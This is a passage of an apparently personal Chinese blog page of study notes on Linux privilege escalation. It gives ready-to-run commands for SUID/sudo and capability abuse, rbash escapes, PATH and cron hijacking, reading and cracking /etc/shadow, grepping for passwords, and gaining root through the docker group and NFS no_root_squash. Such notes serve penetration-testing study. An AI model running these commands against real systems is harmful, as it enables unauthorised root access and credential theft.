href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#no-root-squash" class="anchor-link heading3"><div>norootsquash</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_0x0b-mysql-提权" class="anchor-link heading2"><div>0x0b mysql 提权</div></a></li></ul></div></aside></div> <!----> <div class="content__content-top"></div> <div class="theme-default-content content__default"><h2 id="一-sudo-和-suid-提权"><a href="#一-sudo-和-suid-提权" class="header-anchor">#</a> <strong>一. sudo 和 suid 提权</strong></h2> <h3 id="_1-何为suid"><a href="#_1-何为suid" class="header-anchor">#</a> 1. 何为suid</h3> <p><img src="/assets/img/image-20220418222753648.png" alt="图片"></p> <p>可见在权限位置有一个s权限。那么这个s的作用是什么呢？
答案是当其他用户执行该文件时，该文件会以root的身份执行。
这里就涉及到了Effective UID和Real UID以及Saved UID
Effective UID: 程序实际操作时生效的UID
Real UID: 执行该程序的用户的实际UID
Saved UID: 在高权限用户降权后，保留的其原本UID (不展开说)</p> <p>所以增加了一个s权限，该程序在实际运行时Effective UID就会变为0，即root的UID</p> <h3 id="_2-sudo"><a href="#_2-sudo" class="header-anchor">#</a> 2. sudo</h3> <p>就是能把一个命令视作root来执行,用sudo-l查看可以被sudo的命令</p> <h3 id="_3-suid与sudo提权"><a href="#_3-suid与sudo提权" class="header-anchor">#</a> 3. SUID与sudo提权</h3> <h3 id="遍历目录中的suid文件"><a href="#遍历目录中的suid文件" class="header-anchor">#</a> 遍历目录中的suid文件</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>find / -perm -u=s 2&gt;/dev/null
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>执行该命令，会得到所有suid文件</p> <p><img src="/assets/img/image-20220418222837137.png" alt="image-20220418222837137"></p> <h3 id="用sudo-l-查看哪些命令能被sudo"><a href="#用sudo-l-查看哪些命令能被sudo" class="header-anchor">#</a> 用sudo -l 查看哪些命令能被sudo</h3> <h3 id="_4-sudo-i"><a href="#_4-sudo-i" class="header-anchor">#</a> 4. sudo -i</h3> <p>表示为了频繁的执行某些只有超级用户才能执行的权限，而不用每次输入密码，可以使用该命令。提示输入密码时该密码为当前账户的密码。没有时间限制。执行该命令后提示符变为“#”而不是“$”。想退回普通账户时可以执行“exit”或“logout” 。运行结果 PWD=/root</p> <h3 id="可利用于提权的命令"><a href="#可利用于提权的命令" class="header-anchor">#</a> 可利用于提权的命令</h3> <h5 id="nmap"><a href="#nmap" class="header-anchor">#</a> nmap</h5> <div class="language- line-numbers-mode"><pre class="language-text"><code>nmap --interactive
!sh
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>使用nmap的udp或tcp syn扫描时，需要用到root权限，所以有些管理员图方便会直接给namp上s权限，而nmap 5.20(使用nmap -v查看nmap版本)之前有一个interactive交互模式(nmap –interactive)，在nmap effective uid为0时，可以通过这个模式获得root权限交互式命令行，成功提权</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>echo &quot;os.execute('/bin/bash')&quot; &gt; ./shellnmap --script=shell
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>全版本通杀提权，利用nmap可以执行指定文件的特点提权</p> <h5 id="find"><a href="#find" class="header-anchor">#</a> find</h5> <div class="language- line-numbers-mode"><pre class="language-text"><code>find / -exec command
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>find命令自带-exec参数，可以执行命令，若find有suid权限，那么使用exec相当于直接提权到root.</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>读文件 find /path -exec {} \;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h5 id="vim"><a href="#vim" class="header-anchor">#</a> vim</h5> <p>vim有了suid就可以任意文件读取了</p> <p>同时也可以输入 :shell</p> <p>来获取root shell</p> <h5 id="bash"><a href="#bash" class="header-anchor">#</a> bash</h5> <div class="language- line-numbers-mode"><pre class="language-text"><code>bash -p  开启一个新shell，suid的话自然是开启root shell
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h5 id="less-more"><a href="#less-more" class="header-anchor">#</a> less，more</h5> <p>和vim差不多，任意文件读取，同时也可以输入 !command 进行提权到root</p> <h5 id="exim"><a href="#exim" class="header-anchor">#</a> exim</h5> <p>exim在特定版本下会有suid提权</p> <p><img src="/assets/img/image-20220418222848171.png" alt="image-20220418222848171"></p> <p>下载exp打就完事了</p> <h2 id="二-rbash-绕过"><a href="#二-rbash-绕过" class="header-anchor">#</a> 二. rbash 绕过</h2> <h3 id="_1-何为rbash"><a href="#_1-何为rbash" class="header-anchor">#</a> 1. 何为rbash</h3> <p>rbash，是出于安全性考虑的一个功能受限的bash，我在vulnhub dc-2首次接触,他的限制性可能会有如下.</p> <ul><li>cd 切换目录</li> <li>含有斜杠 <code>/</code> 的命令, 譬如 <code>/bin/sh</code></li> <li>设置 PATH ENV 等环境变量</li> <li>使用 <code>&gt;</code> <code>&lt;</code> 进行重定向</li> <li>binary 的运行. 通常 root 用户会手动创建 <code>/bin/binary_file -&gt; /home/rbash_user/bin/binary_file</code> 的软链接, 限制性地提供部分 binary_file 给 rbash_user 使用 在 bash 下 <code>echo $SHELL</code>, 可以获取当前环境是否是 rbash.</li></ul> <h3 id="_2-bypass"><a href="#_2-bypass" class="header-anchor">#</a> 2. bypass</h3> <h3 id="scp-bypass"><a href="#scp-bypass" class="header-anchor">#</a> scp bypass</h3> <p>我在http://www.const27.com/2020/07/02/vulnhub-dc-2/就是用scp绕的</p> <p><img src="/assets/img/image-20220418222904748.png" alt="image-20220418222904748"></p> <h3 id="_3-进入命令自带shell-bypass"><a href="#_3-进入命令自带shell-bypass" class="header-anchor">#</a> 3. 进入命令自带shell bypass</h3> <p>man,git config help,more,less,vim,vi,ftp,gdb等命令都有自己的shell，我们只需在他们各自的shell中执行/bin/sh即可
一般都是在shell键入!/bin/sh来bypass rbash</p> <p>下面这种方法也是可行的（似乎仅vim)</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>:set shell=/bin/bash:shell
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>执行上面两个语句，就bypass了</p> <h3 id="_4-find-bypasss"><a href="#_4-find-bypasss" class="header-anchor">#</a> 4 find bypasss</h3> <p>简单概括就是-exec执行一下/bin/bash …</p> <p><img src="/assets/img/image-20220418222918974.png" alt="image-20220418222918974"></p> <h3 id="_5-编程语言-bypass"><a href="#_5-编程语言-bypass" class="header-anchor">#</a> 5 编程语言 bypass</h3> <p>python</p> <p>如果python都可以用的话，那就更轻松了，os安排一下
似乎pty也行?没试</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>python -c &quot;import os;os.system('/bin/bash')&quot;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>php</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>php -a 进入php shell然后执行命令:exec(&quot;/bin/bash&quot;);
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>perl</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>perl -e 'exec &quot;/bin/sh&quot;;'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ruby</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>ruby -e 'exec &quot;/bin/bash&quot;'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="_6-cp-bypass"><a href="#_6-cp-bypass" class="header-anchor">#</a> 6. cp bypass</h3> <p>直接用cp把/usr/bin里的命令复制过来就行了</p> <h3 id="_7-直接更改path-shell变量"><a href="#_7-直接更改path-shell变量" class="header-anchor">#</a> 7. 直接更改PATH/SHELL变量</h3> <p>键入export -p 查看该用户的变量</p> <p><img src="/assets/img/image-20220418222928524.png" alt="image-20220418222928524"></p> <p>如果这俩变量有w权，那么我们可以直接写入来bypass</p> <h3 id="_8-ssh-bypass"><a href="#_8-ssh-bypass" class="header-anchor">#</a> 8. ssh bypass</h3> <p>原理是通过ssh链接当前IP的当前用户并启动/bin/bash</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>ssh username@Ip -t &quot;/bin/bash&quot;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="_9-echo-bypass"><a href="#_9-echo-bypass" class="header-anchor">#</a> 9. echo bypass</h3> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> os.system<span class="token punctuation">(</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="三-内核提权"><a href="#三-内核提权" class="header-anchor">#</a> 三. 内核提权</h2> <p>用 uanme -a 查明内核版本</p> <p><img src="/assets/img/image-20220418222936531.png" alt="image-20220418222936531"></p> <p>然后找exp打就完事了，内核提权的内容有点底层，暂时不用深入了解</p> <h2 id="四-passwd和shadow"><a href="#四-passwd和shadow" class="header-anchor">#</a> 四. passwd和shadow</h2> <h3 id="_1-明文密码"><a href="#_1-明文密码" class="header-anchor">#</a> 1. 明文密码</h3> <p>/etc/passwd 默认所有用户可读，但只有root可写。
/etc/passwd里的用户口令往往以x代替，其加密后的密码会存入/etc/shadow里面，/etc/shadow默认只有root可读。</p> <p>但是有小概率情况，明文密码就直接出现在/etc/passwd了，如果有这个情况且root密码暴露在了passwd里，那么就可以轻而易举提权了</p> <h3 id="_2-passwd-可写"><a href="#_2-passwd-可写" class="header-anchor">#</a> 2. passwd 可写</h3> <p>如果/etc/passwd 我们当前用户可写，可以直接把root的密码改成一个明文密码，从而达到提权目的</p> <h3 id="_3-爆破shadow"><a href="#_3-爆破shadow" class="header-anchor">#</a> 3. 爆破shadow</h3> <p>如果/etc/shadow 可读，我们可以用hashcat或者john暴力破解shadow文件</p> <h2 id="五-计划任务"><a href="#五-计划任务" class="header-anchor">#</a> 五. 计划任务</h2> <h3 id="_1-文件重写"><a href="#_1-文件重写" class="header-anchor">#</a> 1. 文件重写</h3> <p>计划任务由crontab管理，非root用户是无法列出root用户的计划任务的，但我们可以列出/etc的系统任务，系统任务默认是root权限运行的</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>ls -l /etc/cron*
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>如果我们有幸有权限能更改其中一个任务指定的脚本，我们就可以往脚本里添加如反弹shell等指令，从而提权</p> <h3 id="_2-环境变量劫持"><a href="#_2-环境变量劫持" class="header-anchor">#</a> 2. 环境变量劫持</h3> <p>我们查看定时任务</p> <p><img src="/assets/img/image-20220418222949950.png" alt="image-20220418222949950"></p> <p>发现定义了诸多环境变量，如果其任务有未指定绝对路径的指令，如</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>17 *    * * *   root    shell.sh
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持</p> <p>比如我们在/sbin 写入一个 反弹shell功能的shell.sh，那么就可以造成提权</p> <h3 id="_3-通配符提权"><a href="#_3-通配符提权" class="header-anchor">#</a> 3. 通配符提权</h3> <p>https://www.secpulse.com/archives/72965.html 总结的太好了，我都不想记笔记了（偷懒</p> <h2 id="六-环境变量"><a href="#六-环境变量" class="header-anchor">#</a> 六. 环境变量</h2> <p>如果我们找到一个suid权限的程序，但是我们无法完成suid提权，就可以试试搭配环境变量进行提权。</p> <p>这个提权方法的思想是，找到有suid的，内部有system函数调用未指定路径的命令的文件。同时用户有修改自己环境变量的权限，</p> <p>我们就可以通过劫持system函数里调用的脚本文件，使其指向我们环境变量里自行创建的一个同名脚本文件，那么这个我们自行创建的同名脚本文件就能以root权限运行了，如果这个脚本文件里的命令是/bin/bash，那么就相当于我们提权了。</p> <p>可能有点小绕，看下面具体操作就行了。</p> <p>实验室配置:</p> <p>首先在一个目录下创建如下文件</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>vim demo.c
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>然后 gcc demo.c -o shell 将其编译为可执行文件</p> <p>然后 chmod u+s shell 为其增加suid权限</p> <p>攻击者视角:</p> <p>首先使用下列指令搜寻suid权限文件</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>find / -perm -u=s -type f 2&gt;/dev/null
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/assets/img/image-20220418222958769.png" alt="image-20220418222958769"></p> <p>发现可疑目标，执行一下看看</p> <p><img src="/assets/img/image-20220418223005230.png" alt="image-20220418223005230"></p> <p>发现返回了ps命令的结果，我们可以以此猜测这个文件内部 有 system(“ps”); 这条c语言代码。
遂可尝试环境变量提权</p> <p>我们依次执行以下命令</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>cd /tmpecho &quot;/bin/bash&quot; &gt; psexport $PATH=/tmp:$PATH        需要修改自身环境变量的权限，但基本上都有这个权限
chmod 777 ./ps                 没这条命令会导致提权失败
cd /home/const27
./shell                        提权成功
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><img src="/assets/img/image-20220418223025863.png" alt="image-20220418223025863"></p> <h2 id="七-密码查找"><a href="#七-密码查找" class="header-anchor">#</a> 七. 密码查找</h2> <p>这个提权技术说白了，就是去到处翻密码</p> <h3 id="_1-文件内查找"><a href="#_1-文件内查找" class="header-anchor">#</a> 1. 文件内查找</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>grep --color=auto -rnw '/' -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/nullfind . -type f -exec grep -i -I &quot;PASSWORD&quot; {} /dev/null \;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>我们可以通过以上命令，指定关键字，在所有文件中搜索内容中有关键字的文件。</p> <h3 id="_2-查找十分钟内更改过的文件"><a href="#_2-查找十分钟内更改过的文件" class="header-anchor">#</a> 2. 查找十分钟内更改过的文件</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>find / -mmin -10 2&gt;/dev/null | grep -Ev &quot;^/proc&quot;  (不显示^/proc文件或文件夹)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="八-capabilities"><a href="#八-capabilities" class="header-anchor">#</a> 八. capabilities</h2> <p>capabilities 是linux2.2后出现的产物，它的出现一定程度上弥补了suid这种粗糙的权限管理机制，但是capabilities 自身也有造成提权的安全隐患</p> <h3 id="_1-简介"><a href="#_1-简介" class="header-anchor">#</a> 1. 简介</h3> <p>capabilities 把root的权限细分了，可以分别启用或者禁用。</p> <p>在进行特权操作的时候，如果euid不是root，那么系统就会检查是否具有执行特权操作的对应capabilities ，并以此为凭据决定特权操作是否能被执行。</p> <p>如下是一些常见的特权操作及其对应capabilities</p> <p><img src="/assets/img/image-20220418223102459.png" alt="image-20220418223102459"></p> <p>关于capabilities的管理工具有如下:</p> <ul><li>getcap</li> <li>setcap</li> <li>capsh</li> <li>filecap</li></ul> <p>getcap 用于查询capabilities，setcap用于设置capabilities，capsh用于查当前shell进程的capabilities，filecap既能设置又能查询。</p> <p>我们可以通过以下指令搜索设置了capabilities的可执行文件</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>getcap -r / 2&gt;/dev/null
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="_2-实操"><a href="#_2-实操" class="header-anchor">#</a> 2. 实操</h3> <h3 id="通过cap-setuid"><a href="#通过cap-setuid" class="header-anchor">#</a> 通过cap_setuid</h3> <p>cap_setuid 可以设置当前用户的euid，我们可以通过此选项来进行一些提权。</p> <p>以python为例</p> <p>我们发现python3.8 有cap_setuid权限，那么我们可以用以下指令进行提权</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>python -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/assets/img/image-20220418223112298.png" alt="image-20220418223112298"></p> <p>类似的有很多。</p> <p>perl</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>gdb</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>php</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>php -r &quot;posix_setuid(0); system('/bin/sh');&quot;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>python</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>python -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>rvim</p> <p>需要支持python3模块。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>rvim -c ':py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>vim</p> <p>需要支持python3模块。<code>vim --version</code>查询，是否支持py3</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>vim -c ':py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="通过cap-dac-read-search"><a href="#通过cap-dac-read-search" class="header-anchor">#</a> 通过CAP_DAC_READ_SEARCH</h3> <p>cap_dac_read_search可以绕过文件的读权限检查以及目录的读/执行权限的检查。</p> <p>利用此特性我们可以读取系统中的敏感信息。</p> <p>如果tar有此权限，我们可以通过此来查看敏感文件内容。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>tar cvf shadow.tar /etc/shadow  //创建压缩文件tar -xvf shadow.tar  //解压缩cd etc  //进入解压缩的目录chmod +r shadow  //赋予读权限cat shadow | grep root  //查看shadow文件的内容
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="九-docker"><a href="#九-docker" class="header-anchor">#</a> 九. Docker</h2> <h3 id="_1-docker用户组提权"><a href="#_1-docker用户组提权" class="header-anchor">#</a> 1. Docker用户组提权</h3> <p>如果我们拿到了一个Docker用户组的用户权限，那么我们可以很轻松地完成提权</p> <p>首先我们执行如下命令</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>docker run -v /:/mnt --rm -it crf_web1 chroot /mnt sh
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>然后在其中的/etc/passwd中写入一个root权限用户（我这里直接无密码了）</p> <p><img src="/assets/img/image-20220418223122812.png" alt="image-20220418223122812"></p> <p>然后退出来，直接尝试 su root2</p> <p><img src="/assets/img/image-20220418223128771.png" alt="image-20220418223128771"></p> <p>提权成功</p> <h2 id="_0x0a-nfs"><a href="#_0x0a-nfs" class="header-anchor">#</a> 0x0a NFS</h2> <p>NFS 是一个用来共享目录的东西，但若配置权限不当则会引发安全问题</p> <h3 id="no-root-squash"><a href="#no-root-squash" class="header-anchor">#</a> no_root_squash</h3> <p>我们cat /etc/exports 如果有no_root_squash字样，则说明root用户就会对共享目录拥有至高的权限控制，就像是对本机的目录操作一样。</p> <p>也就是说，任何机器的root在此目录上都有最高权限。</p> <p>我们在获得一台机器的root权限后，可以通过nfs在另一台低权限机器上实现提权</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>mkdir /tmp/nfsmount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs 将本机上的/tmp/nfs 挂载到共享目录cp /bin/bash /tmp/nfs/bashchmod u+s /tmp/nfs/bash  设置共享目录上bash的suid
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>回到低权限机，执行 /tmp/bash 完成提权</p> <h2 id="_0x0b-mysql-提权"><a href="#_0x0b-mysql-提权" class="header-anchor">#</a> 0x0b mysql 提权</h2> <p>mysql 提权参考：</p> <p>https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html</p> <p>https://www.sqlsec.com/2020/11/mysql.html</p> <p>https://xz.aliyun.com/t/10373</p></div> <!----> <div class="content__content-bottom"></div> <footer class="page-meta"><div class="edit-link"><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" class="icon edit-icon"><path d="M117.953 696.992 64.306 959.696l265.931-49.336 450.204-452.505-212.284-213.376-450.204 452.513zm496.384-296.326L219.039 797.993l-46.108-46.34L568.233 354.33l46.104 46.335zm345.357-122.99-114.45 115.04-212.288-213.377 114.45-115.035 212.288 213.371zm0 0" fill="currentColor"></path></svg> <a href="https://github.com/lhzzzzzz/fun_blog/edit/master/docs/security/渗透/1.linux提权总结.md" target="_blank" rel="noopener noreferrer">编辑此页</a></div> <div class="meta-item update-time"><span class="label">上次编辑于:</span> <span class="info">2022年4月20日 14:36</span></div> <!----></footer> <!----> <div class="comments-wrapper" style="display:none;"><div class="waline-wrapper" style="display:none;"><div id="waline-comment"></div></div></div> <!----> <div class="content__page-bottom"></div></main> <footer class="footer-wrapper"><!----> <div class="footer"><a href='https://beian.miit.gov.cn/' target='_blank'>陕ICP备2022004412号</a></div> <div class="copyright">Copyright © 2022 lhz</div></footer></div><div class="global-ui"><!----><!----><div id="pwa-install"><!----> <div id="install-modal-wrapper" style="display:none;"><div class="background"></div> <div class="install-modal"><div class="header"><button aria-label="关闭" class="close-button"><svg width="23" height="22" xmlns="http://www.w3.org/2000/svg" class="icon close-icon"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.12.358a1.224 1.224 0 011.729 0l8.92 8.914L20.686.358a1.224 1.224 0 011.73 1.728L13.497 11l8.92 8.913a1.222 1.222 0 11-1.73 1.729l-8.919-8.913-8.92 8.913a1.224 1.224 0 01-1.729-1.729L10.04 11l-8.92-8.914a1.222 1.222 0 010-1.728z" fill="currentColor"></path></svg></button> <div class="logo"><!----> <div class="title"><h1></h1> <p class="desc">该应用可以安装在您的 PC 或移动设备上。这将使该 Web 应用程序外观和行为与其他应用程序相同。它将在出现在应用程序列表中，并可以固定到主屏幕，开始菜单或任务栏。此 Web 应用程序还将能够与其他应用程序和您的操作系统安全地进行交互。</p></div></div></div> <div class="content"><div class="highlight"><!----> <!----></div> <div class="description"><h3>详情</h3> <p></p></div></div> <div class="button-wrapper"><button class="install-button">
        安装 <span></span></button> <button class="cancel-button">
        取消
      </button></div></div></div></div><div tabindex="-1" role="dialog" aria-hidden="true" class="pswp"><div class="pswp__bg"></div> <div class="pswp__scroll-wrap"><div class="pswp__container"><div class="pswp__item"></div> <div class="pswp__item"></div> <div class="pswp__item"></div></div> <div class="pswp__ui pswp__ui--hidden"><div class="pswp__top-bar"><div class="pswp__counter"></div> <button class="pswp__button pswp__button--close"></button> <button class="pswp__button pswp__button--share"></button> <button class="pswp__button pswp__button--fs"></button> <button class="pswp__button pswp__button--zoom"></button> <div class="pswp__preloader"><div class="pswp__preloader__icn"><div class="pswp__preloader__cut"><div class="pswp__preloader__donut"></div></div></div></div></div> <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class="pswp__share-tooltip"></div></div> <button class="pswp__button pswp__button--arrow--left"></button> <button class="pswp__button pswp__button--arrow--right"></button> <div class="pswp__caption"><div class="pswp__caption__center"></div></div></div></div></div></div></div>
    <script src="/assets/js/app.def6d153.js" defer></script><script src="/assets/js/vendors~layout-Layout.309fb718.js" defer></script><script src="/assets/js/vendors~layout-Blog~layout-Layout~layout-NotFound.cc9ab5fb.js" defer></script><script src="/assets/js/page-linux提权总结.6ebb2f42.js" defer></script><script src="/assets/js/vendors~layout-Blog~layout-Layout~layout-NotFound~layout-Slide.863359a5.js" defer></script>
  </body>
</html>
